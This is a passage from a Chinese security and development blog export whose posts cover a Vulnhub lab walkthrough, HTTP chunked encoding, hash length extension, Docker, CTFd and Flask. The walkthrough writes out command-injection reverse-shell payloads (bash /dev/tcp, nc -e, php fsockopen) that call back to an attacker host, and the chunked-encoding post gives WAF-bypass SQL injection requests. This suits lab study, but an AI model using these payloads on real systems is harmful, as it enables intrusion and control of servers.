{"pages":[],"posts":[{"title":"Vulnhub靶机-acid","text":"靶机下载 配置使用Vmware中的kali和靶机，网络连接方式为桥接 信息收集查看kali所在的IP地址和子网 12345678910111213root@kaliattack:~# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:0c:29:75:0a:17 brd ff:ff:ff:ff:ff:ff inet 192.168.1.4/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0 valid_lft 76222sec preferred_lft 76222sec inet6 fe80::20c:29ff:fe75:a17/64 scope link noprefixroute valid_lft forever preferred_lft forever 扫描靶机 1234567891011121314151617root@kaliattack:~# nmap -sP 192.168.1.4/24Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 12:54 CSTNmap scan report for 192.168.1.1 (192.168.1.1)Host is up (0.0024s latency).MAC Address: B4:DE:DF:5D:FE:70 (zte)Nmap scan report for 192.168.1.2 (192.168.1.2)Host is up (0.0023s latency).MAC Address: FC:7C:02:9C:00:59 (Phicomm (Shanghai))Nmap scan report for laptop-lkst0l6r (192.168.1.3)Host is up (0.000077s latency).MAC Address: 00:0E:C6:BB:D2:3F (Asix Electronics)Nmap scan report for acid (192.168.1.5)Host is up (0.00030s latency).MAC Address: 00:0C:29:83:5A:CF (VMware)Nmap scan report for kaliattack (192.168.1.4)Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 1.97 seconds 靶机在 192.168.1.5，物理机在 192.168.1.3 扫描所有65535个端口，并做服务指纹识别 1234567891011root@kaliattack:~# nmap -p1-65535 -sV 192.168.1.5Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-20 10:34 CSTNmap scan report for acid (192.168.1.5)Host is up (0.0028s latency).Not shown: 65534 closed portsPORT STATE SERVICE VERSION33447/tcp open http Apache httpd 2.4.10 ((Ubuntu))MAC Address: 00:0C:29:83:5A:CF (VMware)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.13 seconds 33447端口有web服务，apache 2.4.10。 扫描一下目录 1234567891011121314151617181920212223242526272829dirb http://192.168.1.5:33447-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Mon Jan 20 12:08:54 2020URL_BASE: http://192.168.1.5:33447/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612---- Scanning URL: http://192.168.1.5:33447/ ----==&gt; DIRECTORY: http://192.168.1.5:33447/css/==&gt; DIRECTORY: http://192.168.1.5:33447/images/+ http://192.168.1.5:33447/index.html (CODE:200|SIZE:899)+ http://192.168.1.5:33447/server-status (CODE:403|SIZE:302)---- Entering directory: http://192.168.1.5:33447/css/ -------- Entering directory: http://192.168.1.5:33447/images/ ----+ http://192.168.1.5:33447/images/Thumbs.db (CODE:200|SIZE:31744)-----------------END_TIME: Mon Jan 20 12:09:02 2020DOWNLOADED: 13836 - FOUND: 3 漏洞挖掘查看index的网页源代码，最后一行有一串十六进制数字 1&lt;!--0x643239334c6d70775a773d3d--&gt; 转换成字符串 1d293LmpwZw== base64解码 1wow.jpg 访问一下wow.jpg，404，再看看上面的目录扫描结果，有个images目录，访问images/wow.jpg，看到了success。把这张图片保存下来，打开发现最后有一行 137:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34 转换成字符串 17aee0f6d588ed9905ee37f16a7c610d4 目测是md5，解密得到63425，大概就是密码了，但是没地方可用。 换Dirbuster再扫描目录（要用big的字典），能扫到一个Challenge目录（扫了也就一个多小时吧），能看到下面cake.php, error.php, hacked.php, include.php, index.php ，还有js，styles，css，less各种文件夹。 cake.php无法访问，index需要邮箱和密码登录，include.php有包含漏洞，但没有上传点。 包含cake.php，发现又一串神秘数字 1&lt;!--0x5933566a4c6e4a34626e413d--&gt; 转字符串 1Y3VjLnJ4bnA= base64解码 1cuc.rxnp 但是不知道它是干嘛的。 访问cake.php能看到title的位置有/Magic_Box，访问一下返回了403，再用DIrbuster爆破一轮，扫到了low.php，command.php， tails.php。 low是一个空页面，command有命令执行，tails要求输入secretkey，63425和cuc.rxnp都没有用。 command的命令执行输入192.168.1.4;ls，返回 123456789101112131415PING 192.168.1.4 (192.168.1.4) 56(84) bytes of data.64 bytes from 192.168.1.4: icmp_seq=1 ttl=64 time=0.356 ms64 bytes from 192.168.1.4: icmp_seq=2 ttl=64 time=0.297 ms64 bytes from 192.168.1.4: icmp_seq=3 ttl=64 time=0.352 ms--- 192.168.1.4 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 1998msrtt min/avg/max/mdev = 0.297/0.335/0.356/0.026 mscommand.phpcommand.php.savecommand2.php.savecommand2.php.save.1low.phpproctails.php 存在命令执行 漏洞利用反弹shell，先在kali上监听端口 1nc -lvvp 4444 利用命令执行反弹shell，url编码192.168.1.4;bash -i &gt;&amp; /dev/tcp/192.168.1.4/4444 0&gt;&amp;1 1%31%39%32%2E%31%36%38%2E%31%2E%34%3B%62%61%73%68%20%2D%69%20%3E%26%20%2F%64%65%76%2F%74%63%70%2F%31%39%32%2E%31%36%38%2E%36%34%2E%31%2F%34%34%34%34%20%30%3E%26%31 没有收到，换nc，192.168.1.4;nc -e /bin/bash -d 192.168.1.4 4444 1%31%39%32%2E%31%36%38%2E%31%2E%34%3B%6E%63%20%2D%65%20%2F%62%69%6E%2F%62%61%73%68%20%20%2D%64%20%31%39%32%2E%31%36%38%2E%31%2E%34%20%34%34%34%34 还不行，换php，192.168.1.4;php -r '$sock=fsockopen(&quot;192.168.1.4&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);' 1%31%39%32%2e%31%36%38%2e%31%2e%34%3b%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%39%32%2e%31%36%38%2e%31%2e%34%22%2c%34%34%34%34%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27 成功收到反弹的shell 获取信息su，提示must be run from a terminal。用python调用本地的shell 12echo &quot;import pty; pty.spawn('/bin/bash')&quot; &gt; /tmp/asdf.pypython /tmp/asdf.py 现在可以执行su了 cat /etc/passwd能发现acid用户，find / -user acid 2&gt;/dev/null查找acid的文件，不输出错误，发现/sbin/raw_vs_isi/hint.pcapng，下载下来看一下 1scp /sbin/raw_vs_isi/hint.pcapng root@192.168.1.4:/root/ 查看这个包，发现saman and nowadays he's known as 1337hax0r，su saman，密码就是1337hax0r，同样的密码登录root，得到flag。 参考文章：安全客文章","link":"/2020/01/19/acid/"},{"title":"HTTP 分块传输","text":"HTTP 分块传输 简介分块传输编码（Chunked transfer encoding）是指超文本传输协议（HTTP）中的一种数据传输机制，允许 HTTP 应用服务器发送给客户端应用（通常是浏览器）的数据可以分成多个部分，分块传输编码只在 HTTP协议1.1版本（HTTP/1.1）中提供。 一般情况HTTP请求包的Header包含Content-Length域来指明报文体的长度。有时候服务生成HTTP回应是无法确定消息大小的，比如大文件的下载，或者后台需要复杂的逻辑才能全部处理页面的请求，这时用需要实时生成消息长度，服务器一般使用chunked编码。 在进行Chunked编码传输时，在回复消息的Headers有Transfer-Encoding域值为chunked，表示将用chunked编码传输内容。 这在http协议中也是个常见的字段，用于http传送过程的分块技术，原因是http服务器响应的报文长度经常是不可预测的，使用Content-length的实体搜捕并不是总是管用。 分块技术的意思是说，实体被分成许多的块，也就是应用层的数据，TCP在传送的过程中，不对它们做任何的解释，而是把应用层产生数据全部理解成二进制流，然后按照MSS的长度切成一分一分的，一股脑塞到tcp协议栈里面去，而具体这些二进制的数据如何做解释，需要应用层来完成。 基础分块传输的 POST 数据包需添加 Header 1Transfer-Encoding: Chunked 请求体内容： 12345672 # 表示下面数据的个数，可以在后面添加分号作为注释id # 参数，id是两个字符，所以上面一行是22 # 同上=1 # 加上前面的 id，结果 POST 的数据是 id=10 # 分块传输用 0 和两个换行作为结束# 换行# 换行 Bypass WAF添加注释一些 WAF 已经对 Transfer-Encoding 的分块传输做了处理，可以把分块组合成完整的 HTTP 数据包，这时直接使用常规的分块传输方式进行绕过会被 WAF 识别。 分块传输可以在长度标识处加分号作为注释，如： 19;kdsafsa 原数据包： 123456789101112131415161718POST /xxxxxx.jsp HTTP/1.1......Transfer-Encoding: Chunked9xxxxxxxxx9xx=xxxxxx9xxxxxxxxx1d9&amp;a=1 and 32=20（两个换行） 加入注释的数据包： 123456789101112131415161718POST /xxxxxx.jsp HTTP/1.1......Transfer-Encoding: Chunked9xxxxxxxxx9xx=xxxxxx9xxxxxxxxx1;testsdasdsadd9;test&amp;a=1 and 3;test444442=20(两个换行) Bypass ModSecurityModSecurity 是加载在中间件上的插件，可以直接获取到完整的 HTTP 数据包然后匹配危险关键字，需要传畸形的数据包绕过。例如： 12345678POST /sql.php?id=2%20union HTTP/1.1......Transfer-Encoding: chunked1aa0(两个换行) 123456789101112POST /sql.php?id=1 HTTP/1.1Host: 10.10.10.10Connection: keep-aliveContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedContent-Length: 16312310(两个换行) 工具Github -Burp 插件","link":"/2020/06/19/chunked-transfer/"},{"title":"Cobalt Strike 相关","text":"东抄抄，西抄抄 CS 4.0 基本操作 Cobalt Strike 4.0 用户手册","link":"/2020/07/07/cobalt-strike/"},{"title":"重要文件位置","text":"Nginx1234567配置文件存放目录： /etc/nginx主配置文件： /etc/nginx/conf/nginx.conf管理脚本： /usr/lib64/systemd/system/nginx.service模块： /usr/liib64/nginx/modules应用程序： /usr/sbin/nginx程序默认存放位置： /usr/share/nginx/html日志默认存放位置： /var/log/nginx Apache12345配置文件： /etc/httpd/conf/http.conf服务器根目录： /var/www/html访问日志文件： /var/log/httpd/access_log错误日志文件： /var/log/httpd/error_log模块存放位置： /usr/lib/httpd/modules","link":"/2019/11/27/configure-position/"},{"title":"crypto","text":"一些密码学原理和工具 MD5算法 把消息分组，每组64 byte(512 bit)，。 对最后一个消息快（不足 56 byte）进行填充，留下最后的 8 byte 用来标识补充前消息的总长度，中间部分用padding 补位，以 0x80（0b10000000）开头，后面全0，直到长度达到 56 byte。 每个消息块第 57 byte开始存储补位前信息的长度（单位为bit），小端存储。例如：message填充后（hex） 16d 65 73 73 61 67 65 80 00000000..... （最后8byte） 38 00 00 00 00 00 00 00 MD5 有4个初始链变量，经过哈希摘要后，链变量的值会改变，最后一轮产生的链变量高低位呼唤就是计算出的MD5值。 1234A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476 哈希长度扩展攻击受攻击的算法：MD4、MD5、RIPEMD-160、SHA-0、SHA-1、SHA-256、SHA-512、WHIRLPOOL 如果已知key的长度，原信息以及md5(key + message)，就可以得到后面添加任意字符的md6值md5(key + message + any)。 以md5为例，将原信息按md5填充后，得到了md5值，这个值实际上（如果有）就是下一个消息快计算的初始链变量高低位互换。也就是说我们在后面填充新的信息，用这个链变量继续按md5算法继续计算就能得到md5(secret + message + any)。","link":"/2020/03/12/crypto/"},{"title":"CTFd 搭建","text":"系统 Ubuntu 16.04 LTS，腾讯云 准备安装 docker 和 docker-compose 安装1sudo git clone https://github.com/isislab/CTFd.git 进入目录 1docker-compose up -d","link":"/2020/08/03/ctfd/"},{"title":"Docker","text":"Docker，Docker Compose 和 Docker Swarm Docker 架构Docker 包含三个基本概念： 镜像（Image）：相当于一个 root 文件系统 容器（Container）：容器时镜像运行的实体，可以创建、启动、停止、删除、暂停等 仓库（Repository）：可以看作代码控制中心，用于保存镜像 Docker 使用 C/S 架构模式，使用远程 API 管理和创建 Docker 容器，Docker 容器通过 Docker 镜像创建。 Docker 客户端（Client）通过命令行或者其他工具使用 Docker SDK 与 Docker 守护进程通信；Docker 主机（Host）用于运行 Docker 守护进程。 Docker Machine 是一个简化 Docker 安装的命令行工具。 Docker 安装Docker 使用容器镜像仓库DockerfileDocker ComposeDocker MachineSwarm 集群管理简介Docker Swarm 是 Docker 的集群管理工具，将Docker 主机池转变为单个虚拟 Docker 主机。Docker Swarm 提供了标准的 Docker API，所有任何已经与 Docker 守护进程通信的工具都可以使用 Docker Swarm 轻松拓展到多个主机。 原理Swarm 集群由管理节点（manager）和工作节点（work node）组成。管理节点负责整个集群的管理工作，包括集群配置，服务管理等；工作节点主要负责云翔响应的服务来执行任务（task）。 ![Docker Swarm原理](Docker Swarm原理.png) 使用","link":"/2020/08/06/docker/"},{"title":"flask 开发","text":"使用 python3，linux Flask 简介准备创建应用目录git clone 现成的 git 仓库 123git clone https://github.com/miguelgrinberg/flasky.gitcd flaskygit checkout 1a 或者新建目录 12mkdir flaskycd flasky 准备虚拟环境使用venv的虚拟环境可以运行独立的解释器，安装独立的包。 123apt install python3-venv# 在flasky目录下python3 -m venv venv 激活虚拟环境 1source venv/bin/active 完成虚拟环境中的工作后使用 deactivate 取消激活 安装 flask在虚拟环境中安装flask 1(venv) $ pip install flask 应用的基本结构初始化12from flask import Flaskapp = Flask(__name__) 初始化 flask 应用需要创建一个 Flask类的对象，这个对象的初始化需要一个参数，即模块的__name。 web服务器通过WSGI(web server gateway interface) 协议把接收到的请求交给flask应用实例处理。 路由和视图函数客户端（例如浏览器）把请求发送给web服务器，服务器再把请求发给Flask应用实例，应用实例需要知道每个URL对应哪些代码，所以需要URL与python函数的映射关系，称为路由。。 定义路由的最简单方式是使用app.route装饰器 123@app.route('/')def index(): return '&lt;h1&gt;Hello,world!&lt;/h1&gt;' 也可以使用app.add_url_rule()方法 123def index(): return '&lt;h1&gt;Hello,world!&lt;/h1&gt;'app.add_url_rule('/','index',index) index()称为视图函数，客户端访问/时会触发index函数，返回值称为响应，是客户端看到的内容。 Flask 的 URL中可以使用动态内容 123@app.route('/user/&lt;name&gt;')def user(name): return 'Hello,{}!'.format(name) URL中的动态部分（由app.route中的尖括号指定）会作为参数传入视图函数，默认是字符串类型，可以使用其他类型，形如@app.route('/user/&lt;int:id&gt;')，可食用的过滤器有 string,，int，float 和 path。 完整应用实例hello.py 123456from flask import Flaskapp = Flask(__name__)@app.route('/')def index(): return '&lt;h1&gt;Hello,world!&lt;/h1&gt;' Web开发服务器通过 flask run 命令可以启动 flask自带的开发服务器，启动前需要设置FLASK_APP环境变量 12export FLASK_APP=hello.pyflask run 也可以使用app.run()方法启动，在上面flask实例最后加上 12if __name__ == '__main__': app.run() 开发服务器默认运行在5000端口 调试模式启动调试模式后，开发服务器会加载重载器和调试器。重载器监测文件目录，发现改动时自动重启服务器；调试器在Web浏览器提供交互式追踪，也可以审查源码。 与上例对应，启动方式分两种 123export FLASK_APP=hello.pyexport FLASK_DEBUG=1flask run 或者 1app.run(debug=True) 命令行选项1flask --help 请求-响应循环应用和请求上下文收到请求时flask需要访问一些对象才能完成对请求的处理，这时要像视图函数传入参数。为了避免传入不必要的参数，flask使用上下文临时把某些对象设置为全局可访问，例如request对象封装了用户发送的HTTP请求： 1234@app.route('/')def index(): user_agent = request.headers.get('User-Agent') return '&lt;p&gt;Your browser is {}&lt;/p&gt;'.format(user_agent) 上下文并不是全局变量，不同线程之间的访问是相互独立的。 Flask有请求上下文和应用上下文 变量 类型 说明 current_app 应用上下文 当前的应用实例 g 应用上下文 处理请求时用作临时存储的对象，每次请求都会重置这个对象 request 请求上下文 请求对象，封装了客户端发送的HTTP请求的内容 session 请求上下文 用户会话，一个字典 Flask 在分派请求之前激活上下文，请求处理完成后将其删除。获取上下文使用app.appcontext()方法。 请求分派收到请求后，Flask 会在app.url_map中寻找处理URL对应使用的函数， request对象封装收到的HTTP请求，含有以下常用属性和方法 1form, args, values, cookies, headers, get_data(), get_form(), blueprint,endpoint, method, scheme, is_secure(), host, path, Query_string, full_path, url, base_url, remote_addr, environ 请求钩子注册请求狗子在请求之前或者之后使用，通过装饰器实现，有四种。 before_request，每次请求之前运行 before_first_request，在第一个请求之前运行 after_request，无异常抛出时在请求之后运行 teardown_request，即使有异常抛出也会在请求之后执行 请求钩子和视图函数之间一般使用 g 对象共享数据。 response对象响应不但包括返回的字符串，还有请求头和HTTP状态码。Flask中有response对象可以处理返回的内容，包含以下常用属性和方法 1status_code, headers, set_cookie(), delete_cookie(), content_length, content_type, set_data(), get_data() redirect()函数专门用来生成重定向响应 123@app.route('/index.php')def indexphp(): redirect('/') abort()函数用于处理错误 1234@app.route('/user/&lt;name&gt;')def user(): if name != 'admin': abort(403) Flask 扩展Flask本身没有许多重要功能，比如数据库和身份验证，这些可以通过Flask扩展实现。 模板Jinja2 模板引擎渲染模板默认情况下，Flask在应用目录的 templates 文件夹下寻找模板 templates/index.html： 1&lt;h1&gt;Hello World!&lt;/h1&gt; templates/user.html： 1&lt;h1&gt;Hello, {{ name }}!&lt;/h1&gt; hello.py： 123456789from flask import Flask, render_template@app.route('/')def index(): return render_template('index.html')@app.route('/user/&lt;name&gt;')def user(name): return render_template('user.html', name=name) 变量上面模板中使用的{{ name }}结构表示一个变量，这是一种特殊的占位符，告诉模板这个位置的值从渲染模板时提供的数据获取。Jinja2能识别许多类型的变量，包括一些复杂的变量，比如列表、字典和对象。 123&lt;p&gt; From a dictionary: {{ adict['key'] }} &lt;\\p&gt;&lt;p&gt; From a list, with a variable index: {{ alist[variableint] }} &lt;\\p&gt;&lt;p&gt; From an object's method: {{ aobj.amethod() }} &lt;\\p&gt; 变量的值可以用过滤器修改，形如 1{{ variable|filter }} 常用过滤器： 过滤器 说明 safe 渲染时不转义(XSS) captalize 首字母大写，其他小写 lower 全部转成小写 upper 全部转成大写||| title 每个单词开头的字母大写 trim 去掉首尾的空格 striptags 去掉HTML标签 控制结构Jinja2提供了控制结构改变渲染流程。 条件判断： 12345{% if user %} Hello, {{ user }}!{% else %} Hello, Stranger!{% endif %} 循环结构： 12345&lt;ul&gt; {% for comment in comments %} &lt;li&gt;{{ comment }}&lt;/li&gt; {% endfor %}&lt;/ul&gt; Jinja2还支持宏，类似于函数： 12345678{% macro render_comment(comment) %} &lt;li&gt;{{ comment }}&lt;/li&gt;{% endmacro %}&lt;ul&gt; {% for comment in comments %} {{ render_comment(comment) }} {% endfor %}&lt;/ul&gt; 宏可以单独放在一个文件中，以便重复使用 123456{% import 'macros.html' as macros %}&lt;ul&gt; {% for comment in comments %} {{ macros.render_comment(comment) }} {% endfor %}&lt;/ul&gt; 需要多次重复使用的模板代码片段也可以写到单独的文件中，再引入其他模板 1{% include 'common.html' %} Jinja2支持模板继承，类似于类继承。首先，创建一个base.html的基模板 1234567891011&lt;html&gt;&lt;head&gt; {% block head %} &lt;title&gt;{% block title %}{% endblock %} - My Application&lt;/title&gt; {% endblock %}&lt;/head&gt;&lt;body&gt; {% block body %} {% end block %}&lt;/body&gt;&lt;/html&gt; 基模板中定义的 block 可以在衍生模板中覆盖，本段定义了 head, title 和 body 区块，title包含在head中，衍生模板： 12345678{% extends 'base.html' %}{% block title %}Index{% endblock %}{% block head %} {{ super() }} &lt;style&gt;&lt;/style&gt;{% endblock %}{% block body %}{% endblock %} extends 表明要从 base.html继承，基模板中的block被重新定义，被子模板中同名区块的内容替代，子模板中可以使用 super()引用基模板的内容。 使用Flask-Bootstrap集成Bootstrap1pip install flask-bootstrap 123from flask_bootstrap import Bootstrap# ..bootstrap = Bootstrap(app) 初始化Bootstrap后，就可以使用包含Bootstrap文件的基模板，利用模板继承就可以使用。例如改写user.html： 1234567891011121314151617181920212223242526272829303132{% extends &quot;bootstrap/base.html&quot; %}{% block title %}Flasky{% endblock %}{% block navbar %}&lt;div class=&quot;navbar navbar-inverse&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;navbar-toggle&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.navbar-collapse&quot;&gt; &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Flasky&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;navbar-collapse collapse&quot;&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li&gt;&lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;{% endblock %}{% block content %}&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt;Hello, {{ name }}!&lt;/h1&gt; &lt;/div&gt;&lt;/div&gt;{% endblock %} bootstrap/base.html中定义了很多区块 区块 说明 doc 整个HTML文档 html_attribs &lt;html&gt;标签的属性 html &lt;html&gt;标签中的内容 head &lt;head&gt;标签的内容 title &lt;title&gt;标签的内容 meta 一组&lt;meta&gt;标签 styles CSS声明 body_attribs &lt;body&gt;标签的属性 body &lt;body&gt;标签的内容 navbar 用户定义的导航栏 content 用户定义的页面内容 scripts 文档底部的JavaScript声明 很多区块里都有Bootstrap的自用内容，如果直接覆盖会产生问题，需要使用 super函数 1234{% block scripts %}{{ super() }}&lt;script src='my.js'&gt;&lt;/script&gt;{% endblock %} 自定义错误界面Flask有errorhandler装饰器用于处理错误，错误页面可以由继承模板得到 1234567@app.errorhandler(404)def page_not_found(e): return render_template('404.html'),404@app.errorhandler(500)def internal_server_error(e): return render_template('500.html'),500 模板可以多重继承，将上面的user.html的content和title区块的内容删除，命名为base.html，404.html只需继承base.html并覆盖这两个区块的内容即可生成自定义的错误页面。 链接使用url_for()函数获得页面的链接，参数为视图函数名，动态URL需要传入关键字参数。例如：url_for(user, name='john', page=2, version=1)。 静态文件服务器默认从static文件夹下寻找所需要的静态文件，使用url_for('static', filename='css/style.css')获得链接。 12345{% block head %}{{ super() }}&lt;link rel=&quot;shortcunt icon&quot; href=&quot;{{ url+for('static', filename='favicon.ico') }}&quot; type=&quot;image/x-icon&quot;&gt;&lt;link rel=&quot;icon&quot; href=&quot;{{ url_for('static', filename='favicon.ico') }}&quot; type=&quot;image/x-icon&quot;&gt;{% endblock %} 使用Flask-Moment本地化日期和时间服务器需要统一时间单位，一般使用UTC。不过用户需要的是当地的时间。Flask-moment是一个flask扩展，能简化把Moment.js集成到Jinja2模板的过程。pip install flask-moment。初始化Moment： 12from flask_moment import Momentmoment = Moment(app) Flask-Moment依赖jQuery.js和Moment.js，引入Moment.js： 1234{% block scripts %}{{ super() }}{{ moment.include_moment() }}{% endblock %} 添加一个datetime变量： 12345from datetime import datetime@app.route('/')def index(): return render_tempalate('index.html',currenttime=datetima.utcnow()) 渲染currenttime，templates/index.html： 12&lt;p&gt;The local date and time is {{ cureent_time.format('LLL') }}.&lt;/p&gt;&lt;p&gt;That was {{ moment(current_time.fromNow(refresh=True)) }}&lt;/p&gt; 这里的format('LLL')表示渲染的复杂度，从L到LLLL，还可以接受其他的格式说明符。fromNow渲染相对时间戳，会不断刷新。这个例子显示的是July 18, 2019 12:12 AM，a few seconds ago，随着时间变化还会变成a minute ago、two mimutes ago等等。可以使用locale本地化，例如 1{{ moments.locale('es') }} 表单Flask本身可以处理表单，但可以使用flask-wtf进行简化。pip install flask-wtf。 配置flask-wtf无需再应用层初始化，但需要配置密钥用于防止会话被篡改。 12app = Flask(__name__)app.config['SECRET_KEY'] = 'hard to guess' 为了增强安全性，密钥通常不写在源代码中，而是保存在环境变量中。 表单类使用Flask-wtf时，每个web表单都由一个继承自FlaskForm的类表示。这个类定义表单中的一组字段，每个字段都用对象来表示。字段对象可以附属一个或多个验证函数用于验证用户提交的数据是否有效。 一个例子，包含一个文本字段和提交按钮： 1234567from flask_wtf import FlaskFormfrom wtfroms import StringField, SubmitFieldfrom wtforms,validators import DataRequiredclass NameForm(FlaskForm): name = StringField('What is your name?', validators=[DataRequired()]) submit = SubmitField('Submit') 这个表单中的字段定义为类变量，各个类变量的值时相对应字段类型的对象。这个例子中NameForm表单中有一个名为name的文本字段和一个名为submit的提交按钮。StringField类表示属性为type=”text”的HTML input元素。SubmitField类表示属性为type=”submit”的元素。字段构造函数的第一个参数是渲染HTML时使用的标注label。Validators指定一个由验证函数组成的列表，在用户提交数据之前进行验证。 渲染表单在视图函数中通过form参数把一个NameForm实例传入模板，就可以生成一个HTML表单，可以传入关键字参数添加指定的属性，hidden_tag为表单添加CSRF token。 12345&lt;form method=&quot;POST&quot;&gt; {{ form.hidden_tag() }} {{ form.name.label }}{{ form.name(id='namefiedl') }} {{ form.submit() }}&lt;/form&gt; 使用这样的方式渲染和美化表单工作量依然很大，所以应该尽量使用bootstrap的表单样式，上述表单可以用以下方式渲染，其中quick_form的参数为FlaskWTF表单对象： 12{% import &quot;bootstrap/wtf.html&quot; %}{{ wtf.quick_form(form) }} 一个完整示例（templates/index.html）： 12345678{% extends &quot;base.html&quot; %}{% import &quot;bootstrap/wtf.html&quot; as wtf %}{% block title %}Flasky{% endblock %}{% block page_content %}&lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt;Hello, {% if name %}{{ name }}{% else %}Stranger{% endif %}&lt;/h1&gt;{{ wtf.quick_form(form) }}{% endblock %} 在视图函数中处理表单视图函数需要渲染表单并且收集表单中的用户提交的数据。 12345678@app.route('/', methods=['GET', 'POST'])def index(): name = None form = NameForm() if form.validate_on_submit(): name = form.name.data form.name.data = '' return render_template('index.html', form=form, name=name) 重定向和用户会话上个函数存在一个问题，输入名字并且提交表单后，刷新会收到浏览器的警告，是否重新提交数据。因为最后一个请求是POST，刷新后浏览器会重新发送请求。使用重定向作为POST请求的响应，浏览器会重新发送一个GET请求。 这个方法也有一个问题，用户已经提交了名字，然而一旦用户刷新，POST请求结束，用户提交的数据就不见了。因此应用需要保存输入的名字，这样重定向后的请求才能获得并使用这个名字。 应用把数据存储在用户会话中，用户会话是一种私有存储，每个连接到服务器的客户端都可以访问，属于请求上下文中的变量，名为session，像标准的Python字典一样操作。默认情况下，用户会话保存在客户端的cookie中，使用之前设置的密钥加密签名。 实现重定向和用户会话： 123456789from flask import Flask, render_template, session, redirect, url_for@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): session['name'] = form.name.data return redirect(url_for('index')) return render_template('index.html', form=form, name=session.get('name')) 闪现消息请求完成后，有时需要让用户知道状态发生了改变，比如用户提交了错误的用户名或密码，服务器应该重新渲染表单，并且提示用户名或密码武侠，flash()函数提供这样的功能。 1234567891011from flask import Flask, render_template, session, redirect, rul_for, flash@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_sumit(): old_name = session.get('name') if old_name is not None and old_name != form.name.data: flash('Looks like you have changed your name') session['name'] = form.name.data return redirct(url_for('index')) return render_template('index.html', form = form, name = session.get('name')) 只在视图函数中调用flash()并不能显示信息，模板必须对它进行渲染，可以在基膜版中渲染使得所有页面都能显示闪现信息。Flask为模板提供get_flashed_messages()用于获取和渲染信息。 123456789{% block content %}&lt;div class=&quot;container&quot;&gt; {% for message in get_flashed_messages() %} &lt;div class=&quot;alert alert-warning&quot;&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot;&gt;&amp;times;&lt;/buttion&gt; {{ message }}&lt;/div&gt;{% endfor %}{% block page_content %}{% endblock %} 数据库SQL数据库关系型数据库把数据存储在表中，表为实体建模。表中的列数是固定的，行数是可变的。 NoSQL数据库不符合以上关系模型的数据库统称为NoSQL数据库，一般使用集合代替表，使用文档代替记录。 Python数据库框架大多数数据库引擎提供对应的python包，如果无法满足需求，还有一些数据库抽象层代码包可选，例如 SQL Alchemy 和MongoEngine。 使用 Flask-SQLAlchemy管理数据Flask-SQLAlchemy是一个Flask扩展，简化了在Flask应用中使用SQLAlchemy的操作。pip install flask-sqlalchemy，数据库使用URL指定，几个例子： 数据库引擎 URL Mysql mysql://username:password@hostname/database Postgres postgresql://username:password@hostname/database SQLite(Linux, MacOS) sqlite:////absolute/path/to/database SQLite(Windows) sqlite:///c:/absolute/path/to/database 应用使用的数据库URL必须保存到Flask配置对象的SQLALCHEMY_DATABASE_URI键中。同时建议把SQLIALCHEMY_TRACK_MODIFICATIONS键设置为False，在不需要跟踪对象变化是降低内存消耗。初始化一个简单的SQLite数据库： 12345678import osfrom flask_sqlalchemy import SQLAlchemybasedir = os.path.absopath(os.path.dirname(__file__))app = Flask(__name__)app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'data.sqlite')app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = Falsedb = SQLAlchemy(app) db是SQLAlchemy类的实例，表示应用使用的数据库。 定义模型模型表示应用使用的持久化实体。ORM中，模型一般是一个python类，其中的属性对应于数据库表中的列。定义Role和User模型： 12345678910111213class Role(db.Model): __tablename__ = 'roles' id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(64), unique=True) def __repr__(self): return '&lt;Role %&gt;' % self.nameclass User(db.Model): __tablename__ = 'users' id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(64), unique=True, index=True) def __repr__(self): return '&lt;User %&gt;' % self.username Flask-SQLAlchemy要求每个模型都定义主键。 关系定义关系： 1234567class Role(db.Model): # ... users = db.relationship('User', 